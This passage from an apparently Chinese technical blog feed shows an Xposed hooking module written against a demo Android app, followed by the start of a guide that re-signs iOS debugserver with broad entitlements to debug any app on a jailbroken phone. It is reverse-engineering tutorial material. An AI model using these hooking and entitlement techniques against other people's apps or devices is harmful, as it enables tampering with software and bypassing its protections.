class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XposedHook</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IXposedHookLoadPackage</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handleLoadPackage</span><span class="hljs-params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        <span class="hljs-keyword">if</span> (loadPackageParam.packageName.equals(<span class="hljs-string">&quot;com.example.xposedhooktarget&quot;</span>)) &#123;<br>            <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz = XposedHelpers.findClass(<span class="hljs-string">&quot;com.example.xposedhooktarget.HookDemo&quot;</span>, loadPackageParam.classLoader);<br>            <span class="hljs-comment">//getClassInfo(clazz);</span><br><br>            <span class="hljs-comment">//不需要获取类对象，即可直接修改类中的私有静态变量staticInt</span><br>            XposedHelpers.setStaticIntField(clazz, <span class="hljs-string">&quot;staticInt&quot;</span>, <span class="hljs-number">99</span>);<br><br>            <span class="hljs-comment">//Hook无参构造函数，啥也不干。。。。</span><br>            XposedHelpers.findAndHookConstructor(clazz, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    XposedBridge.log(<span class="hljs-string">&quot;Haha, HookDemo constructed was hooked&quot;</span> );<br>                    <span class="hljs-comment">//大坑，此时对象还没有建立，即不能获取对象，也不能修改非静态变量的值</span><br>                    <span class="hljs-comment">//XposedHelpers.setIntField(param.thisObject, &quot;publicInt&quot;, 199);</span><br>                    <span class="hljs-comment">//XposedHelpers.setIntField(param.thisObject, &quot;privateInt&quot;, 299);</span><br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook有参构造函数，修改参数</span><br>            XposedHelpers.findAndHookConstructor(clazz, String.class,  <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, HookDemo(str) are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook有参构造函数，修改参数------不能使用XC_MethodReplacement()替换构造函数内容，</span><br>            <span class="hljs-comment">//XposedHelpers.findAndHookConstructor(clazz, String.class, new XC_MethodReplacement() &#123;</span><br>            <span class="hljs-comment">//    @Override</span><br>            <span class="hljs-comment">//    protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable &#123;</span><br>            <span class="hljs-comment">//        Log.d(&quot;HookDemo&quot; , &quot;HookDemo(str) was replace&quot;);</span><br>            <span class="hljs-comment">//    &#125;</span><br>            <span class="hljs-comment">//&#125;);</span><br><br>            <span class="hljs-comment">//Hook公有方法publicFunc，</span><br>            <span class="hljs-comment">// 1、修改参数</span><br>            <span class="hljs-comment">// 2、修改下publicInt和privateInt的值</span><br>            <span class="hljs-comment">// 3、再顺便调用一下隐藏函数hideFunc</span><br>            <span class="hljs-comment">//XposedHelpers.findAndHookMethod(&quot;com.example.xposedhooktarget.HookDemo&quot;, clazz.getClassLoader(), &quot;publicFunc&quot;, String.class, new XC_MethodHook()</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;publicFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, publicFunc are hooked&quot;</span>;<br>                    XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;publicInt&quot;</span>, <span class="hljs-number">199</span>);<br>                    XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;privateInt&quot;</span>, <span class="hljs-number">299</span>);<br>                    <span class="hljs-comment">// 让hook的对象本身去执行流程</span><br>                    Method md = clazz.getDeclaredMethod(<span class="hljs-string">&quot;hideFunc&quot;</span>, String.class);<br>                    md.setAccessible(<span class="hljs-keyword">true</span>);<br>                    <span class="hljs-comment">//md.invoke(param.thisObject, &quot;Haha, hideFunc was hooked&quot;);</span><br>                    XposedHelpers.callMethod(param.thisObject, <span class="hljs-string">&quot;hideFunc&quot;</span>, <span class="hljs-string">&quot;Haha, hideFunc was hooked&quot;</span>);<br><br>                    <span class="hljs-comment">//实例化对象，然后再调用HideFunc方法</span><br>                    <span class="hljs-comment">//Constructor constructor = clazz.getConstructor();</span><br>                    <span class="hljs-comment">//XposedHelpers.callMethod(constructor.newInstance(), &quot;hideFunc&quot;, &quot;Haha, hideFunc was hooked&quot;);</span><br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook私有方法privateFunc，修改参数</span><br>            <span class="hljs-comment">//XposedHelpers.findAndHookMethod(&quot;com.example.xposedhooktarget.HookDemo&quot;, clazz.getClassLoader(), &quot;privateFunc&quot;, String.class, new XC_MethodHook()</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;privateFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, privateFunc are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook私有静态方法staticPrivateFunc, 修改参数</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;staticPrivateFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, staticPrivateFunc are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook复杂参数函数complexParameterFunc</span><br>            Class fclass1 = XposedHelpers.findClass(<span class="hljs-string">&quot;java.util.Map&quot;</span>, loadPackageParam.classLoader);<br>            Class fclass2 = XposedHelpers.findClass(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>, loadPackageParam.classLoader);<br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;complexParameterFunc&quot;</span>, String.class,<br>                    <span class="hljs-string">&quot;[[Ljava.lang.String;&quot;</span>, fclass1, fclass2, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, complexParameterFunc are hooked&quot;</span>;<br>                        &#125;<br>                    &#125;);<br><br>            <span class="hljs-comment">//Hook私有方法repleaceFunc, 替换打印内容</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;repleaceFunc&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodReplacement() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">replaceHookedMethod</span><span class="hljs-params">(MethodHookParam methodHookParam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    Log.d(<span class="hljs-string">&quot;HookDemo&quot;</span>, <span class="hljs-string">&quot;Haha, repleaceFunc are replaced&quot;</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">//Hook方法, anonymousInner， 参数是抽象类，先加载所需要的类即可</span><br>            Class animalClazz  = loadPackageParam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.xposedhooktarget.Animal&quot;</span>);<br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;anonymousInner&quot;</span>, animalClazz, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    XposedBridge.log(<span class="hljs-string">&quot;HookDemo This is test&quot;</span>);<br>                    param.args[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Haha, anonymousInner are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook匿名类的eatFunc方法，修改参数，顺便修改类中的anonymoutInt变量</span><br>            XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.example.xposedhooktarget.HookDemo$1&quot;</span>, clazz.getClassLoader(),<br>                    <span class="hljs-string">&quot;eatFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, eatFunc are hooked&quot;</span>;<br>                            XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;anonymoutInt&quot;</span>, <span class="hljs-number">499</span>);<br>                        &#125;<br>                    &#125;);<br><br>            <span class="hljs-comment">//hook内部类的构造方法失败，且会导致hook内部类的InnerFunc方法也失败，原因不明</span><br><span class="hljs-comment">//            XposedHelpers.findAndHookConstructor(clazz1, new XC_MethodHook() &#123;</span><br><span class="hljs-comment">//                        @Override</span><br><span class="hljs-comment">//                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="hljs-comment">//                            XposedBridge.log(&quot;Haha, InnerClass constructed was hooked&quot; );</span><br><span class="hljs-comment">//                        &#125;</span><br><span class="hljs-comment">//                    &#125;);</span><br><br>            <span class="hljs-comment">//Hook内部类InnerClass的InnerFunc方法，修改参数，顺便修改类中的innerPublicInt和innerPrivateInt变量</span><br>            <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz1 = XposedHelpers.findClass(<span class="hljs-string">&quot;com.example.xposedhooktarget.HookDemo$InnerClass&quot;</span>, loadPackageParam.classLoader);<br>            XposedHelpers.findAndHookMethod(clazz1, <span class="hljs-string">&quot;InnerFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, InnerFunc was hooked&quot;</span>;<br>                            XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;innerPublicInt&quot;</span>, <span class="hljs-number">9</span>);<br>                            XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;innerPrivateInt&quot;</span>, <span class="hljs-number">19</span>);<br>                        &#125;<br>                    &#125;);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getClassInfo</span><span class="hljs-params">(Class clazz)</span> </span>&#123;<br>        <span class="hljs-comment">//getFields()与getDeclaredFields()区别:getFields()只能访问类中声明为公有的字段,私有的字段它无法访问，</span><br>        <span class="hljs-comment">//能访问从其它类继承来的公有方法.getDeclaredFields()能访问类中所有的字段,与public,private,protect无关，</span><br>        <span class="hljs-comment">//不能访问从其它类继承来的方法</span><br>        <span class="hljs-comment">//getMethods()与getDeclaredMethods()区别:getMethods()只能访问类中声明为公有的方法,私有的方法它无法访问,</span><br>        <span class="hljs-comment">//能访问从其它类继承来的公有方法.getDeclaredFields()能访问类中所有的字段,与public,private,protect无关,</span><br>        <span class="hljs-comment">//不能访问从其它类继承来的方法</span><br>        <span class="hljs-comment">//getConstructors()与getDeclaredConstructors()区别:getConstructors()只能访问类中声明为public的构造函数</span><br>        <span class="hljs-comment">//getDeclaredConstructors()能访问类中所有的构造函数,与public,private,protect无关</span><br><br>        <span class="hljs-comment">//XposedHelpers.setStaticObjectField(clazz,&quot;sMoney&quot;,110);</span><br>        <span class="hljs-comment">//Field sMoney = clazz.getDeclaredField(&quot;sMoney&quot;);</span><br>        <span class="hljs-comment">//sMoney.setAccessible(true);</span><br>        Field[] fs;<br>        Method[] md;<br>        Constructor[] cl;<br>        fs = clazz.getFields();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fs.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getFiled: &quot;</span> + Modifier.toString(fs[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    fs[i].getType().getName() + <span class="hljs-string">&quot; &quot;</span> + fs[i].getName());<br>        &#125;<br>        fs = clazz.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fs.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getDeclaredFields: &quot;</span> + Modifier.toString(fs[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    fs[i].getType().getName() + <span class="hljs-string">&quot; &quot;</span> + fs[i].getName());<br>        &#125;<br>        md = clazz.getMethods();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; md.length; i++) &#123;<br>            Class&lt;?&gt; returnType = md[i].getReturnType();<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getMethods: &quot;</span> + Modifier.toString(md[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    returnType.getName() + <span class="hljs-string">&quot; &quot;</span> + md[i].getName());<br>            <span class="hljs-comment">//获取参数</span><br>            <span class="hljs-comment">//Class&lt;?&gt; para[] = md[i].getParameterTypes();</span><br>            <span class="hljs-comment">//for (int j = 0; j &lt; para.length; ++j) &#123;</span><br>            <span class="hljs-comment">//System.out.print(para[j].getName() + &quot; &quot; + &quot;arg&quot; + j);</span><br>            <span class="hljs-comment">//if (j &lt; para.length - 1) &#123;</span><br>            <span class="hljs-comment">//    System.out.print(&quot;,&quot;);</span><br>            <span class="hljs-comment">//&#125;</span><br>            <span class="hljs-comment">//&#125;</span><br>        &#125;<br>        md = clazz.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; md.length; i++) &#123;<br>            Class&lt;?&gt; returnType = md[i].getReturnType();<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getDeclaredMethods: &quot;</span> + Modifier.toString(md[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    returnType.getName() + <span class="hljs-string">&quot; &quot;</span> + md[i].getName());<br>        &#125;<br>        cl = clazz.getConstructors();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cl.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getConstructors: &quot;</span> + Modifier.toString(cl[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    md[i].getName());<br>        &#125;<br>        cl = clazz.getDeclaredConstructors();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cl.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getDeclaredConstructors: &quot;</span> + Modifier.toString(cl[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    md[i].getName());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-参考文献"><a href="#6-参考文献" class="headerlink" title="6.参考文献"></a>6.参考文献</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">//hook所有方法<br>https://blog.csdn.net/QQ1084283172/article/details/80954759?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task<br><br>//热修补<br>https://zhuanlan.zhihu.com/p/96773935<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>xposed</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>hook</tag>
      
      <tag>xposed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS修改deubgserver调试所有APP</title>
    <link href="/2021/08/22/iOS%E4%BF%AE%E6%94%B9deubgserver%E8%B0%83%E8%AF%95%E6%89%80%E6%9C%89APP/"/>
    <url>/2021/08/22/iOS%E4%BF%AE%E6%94%B9deubgserver%E8%B0%83%E8%AF%95%E6%89%80%E6%9C%89APP/</url>
    
    <content type="html"><![CDATA[<h2 id="debugserver"><a href="#debugserver" class="headerlink" title="debugserver"></a>debugserver</h2><h3 id="1-导出手机中任意一款APP签名"><a href="#1-导出手机中任意一款APP签名" class="headerlink" title="1. 导出手机中任意一款APP签名"></a>1. 导出手机中任意一款APP签名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldid -e ./bash &gt; bash.entitlements<br></code></pre></td></tr></table></figure><h3 id="2-bash-entitlements文件内容"><a href="#2-bash-entitlements文件内容" class="headerlink" title="2. bash.entitlements文件内容"></a>2. bash.entitlements文件内容</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">plist</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//Apple//DTD PLIST 1.0//EN http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>platform-application<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.security.no-container<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.skip-library-validation<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-导出debugserver中证书"><a href="#3-导出debugserver中证书" class="headerlink" title="3. 导出debugserver中证书"></a>3. 导出debugserver中证书</h3><p>debugserver可执行文件在<code>/Developer/usr/bin/debugserver</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ldid</span> -e ./debugserver &gt; <span class="hljs-literal">debug</span>.entitlements<br></code></pre></td></tr></table></figure><h3 id="4-修改后的debug-entitlements文件"><a href="#4-修改后的debug-entitlements文件" class="headerlink" title="4. 修改后的debug.entitlements文件"></a>4. 修改后的debug.entitlements文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">plist</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>task_for_pid-allow<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.frontboard.debugapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.springboard.debugapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.backboardd.debugapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.memorystatus<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>get-task-allow<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>run-unsigned-code<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.frontboard.launchapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.cs.debugger<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.logging.diagnostic<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.backboardd.launchapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.security.no-container<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.skip-library-validation<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>platform-application<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="5-使用debug-entitlements文件对debugserver进行重新签名"><a href="#5-使用debug-entitlements文件对debugserver进行重新签名" class="headerlink" title="5. 使用debug.entitlements文件对debugserver进行重新签名"></a>5. 使用debug.entitlements文件对debugserver进行重新签名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bas">ldid -Sdebug.entitlements debugserver<br></code></pre></td></tr></table></figure><h3 id="6-上传到手机中"><a href="#6-上传到手机中" class="headerlink" title="6. 上传到手机中"></a>6. 上传到手机中</h3><h2 